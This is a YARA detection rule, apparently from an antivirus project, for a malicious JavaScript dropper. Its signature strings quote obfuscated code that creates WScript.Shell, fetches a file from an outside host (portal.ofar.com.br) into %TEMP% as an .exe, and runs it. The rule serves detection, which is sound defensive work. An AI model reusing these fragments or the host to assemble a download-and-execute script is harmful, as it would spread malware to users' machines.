rule sig_20160328_0b2a13a57df53164e54a679be47ca300 {
  meta:
    description = "datamaliciousorder - file 20160328_0b2a13a57df53164e54a679be47ca300.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9a7ea12d9a5b3e989be531a8549c129bf30e8a90dab325f1e713d47553bb744e"

  strings:
    $s1  = "function Mmvqvw() {return Jtmujsz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lyjyLEVyBrdoqN.exe\";};" fullword ascii
    $s2  = "Mgaxlhgz[Zjmxyhpcl](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Hkhkeienr](Rejbvhsqqx() * 11)} while (Mgaxlhgz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Aayrggwbs(Bhwxwl, Ygxci){return Bhwxwl - Ygxci;};" fullword ascii
    $s5  = "var Jtmujsz = function Dcndfk() {return WScript[Iboqfck](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rfznqkk(Ktejnmo){Jtmujsz[\"Run\"](Ktejnmo, Duzqlwfyw, Duzqlwfyw);};" fullword ascii
    $s7  = "function Jpytxhfs() {return ((Dkjmcfjb == true) && (Dkjmcfjb == Aqbfa)) ? 1 : Duzqlwfyw;};" fullword ascii
    $s8  = "Dkjmcfjb = true; " fullword ascii
    $s9  = " while (Zjknriby){" fullword ascii
    $s10 = "var Aulnbqqi = false;" fullword ascii
    $s11 = "function Huijmdky(Pgctlcwa) {var Xcbsy = (1, 2, 3, 4, 5, Pgctlcwa); return Xcbsy;};" fullword ascii
    $s12 = "var Dkjmcfjb = false;" fullword ascii
    $s13 = "var Aqbfa = false;" fullword ascii
    $s14 = "return Aayrggwbs(Lfjzkb, Ygowbigip);" fullword ascii
    $s15 = "Aqbfa = true; " fullword ascii
    $s16 = "function Efihcohlr()" fullword ascii
    $s17 = "function Rejbvhsqqx(){return 22;};" fullword ascii
    $s18 = "function Zmmqitvwl(){return Dzzauu;};" fullword ascii
    $s19 = "var Yrnzipl = new this[\"Date\"]();" fullword ascii
    $s20 = "function Kyddkwdhg(){return Iboqfck;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}